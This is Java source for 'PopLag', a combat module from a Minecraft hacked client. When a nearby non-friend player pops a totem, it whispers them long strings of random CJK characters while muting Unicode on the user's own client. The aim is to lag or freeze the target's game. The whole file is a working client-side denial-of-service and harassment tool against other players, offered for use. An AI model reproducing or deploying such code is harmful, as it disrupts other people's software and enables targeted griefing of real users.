package dev.jess.baseband.client.impl.Modules.Combat;

import com.mojang.realmsclient.gui.ChatFormatting;
import dev.jess.baseband.client.api.Main.BaseBand;
import dev.jess.baseband.client.api.Module.Category;
import dev.jess.baseband.client.api.Module.Module;
import dev.jess.baseband.client.api.Registry.ModuleRegistry;
import dev.jess.baseband.client.api.Settings.Setting;
import dev.jess.baseband.client.api.Utils.ChatUtil;
import dev.jess.baseband.client.api.Utils.Friends;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.Packet;
import net.minecraft.network.play.server.SPacketEntityStatus;

import java.awt.*;
import java.util.HashMap;

public class PopLag extends Module {
	private final Setting range = new Setting("Range", this, 5, 2, 15, true);
	private final Setting times = new Setting("Times", this, 1, 1, 4, true);
	private final Setting length = new Setting("Length", this, 120, 16, 240, true);
	private HashMap<String, Integer> popList = new HashMap();

	public PopLag() {
		super("PopLag", "Bruh", Category.COMBAT, new Color(211, 150, 255, 255).getRGB());
		BaseBand.settingsManager.rSetting(range);
		BaseBand.settingsManager.rSetting(times);
		BaseBand.settingsManager.rSetting(length);
	}

	public void disable() {
		popList.clear();
	}


	public void tick() {
		for (EntityPlayer player : mc.world.playerEntities) {
			if (player.getHealth() <= 0) {
				if (popList.containsKey(player.getName())) {
					ChatUtil.sendChatMsg(ChatFormatting.GREEN + "Removed " + player.getName() + " from Cache List.");
					popList.remove(player.getName(), popList.get(player.getName()));
				}
			}
		}
	}


	public void lag(String playerName, Integer loopset, Integer length) {
		String s = "";
		int loop = 0;
		while (loop <= loopset) {
			loop++;
			String chars = "㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁";
			StringBuilder randomChars = new StringBuilder();
			for (int var3 = 0; var3 <= length; var3 += 2) {
				randomChars.append(chars.charAt((int) Math.floor(Math.random() * (double) chars.length())));
			}

			s += "/w " + playerName + " " + randomChars;
			if (s.length() >= 256) s = s.substring(0, 256);
			mc.player.sendChatMessage(s);
		}
	}


	public void onPop(Entity e) {
		if (popList == null) {
			popList = new HashMap<>();
		}


		if (popList.get(e.getName()) == null) {
			popList.put(e.getName(), 1);
			if (mc.player.getDistance(e) <= range.getValDouble() && e != mc.player && ! Friends.isFriend(e.getName())) {
				boolean toggledonce = ! ModuleRegistry.getModule("NoUnicode").isToggled();

				if (toggledonce) {
					ModuleRegistry.getModule("NoUnicode").setToggled(true);
				}
				ChatUtil.sendChatMsg(ChatFormatting.GREEN + "Pop-lagging " + e.getName());
				lag(e.getName(), (int) times.getValDouble(), (int) length.getValDouble());
				if (toggledonce) {
					ModuleRegistry.getModule("NoUnicode").setToggled(false);
				}
			}
		}
	}


	public boolean onPacketReceive(Packet<?> packet) {
		if (packet instanceof SPacketEntityStatus) {
			SPacketEntityStatus packet2 = (SPacketEntityStatus) packet;
			if (packet2.getOpCode() == 35) {
				Entity entity = packet2.getEntity(mc.world);
				onPop(entity);
			}
		}

		return false;
	}
}
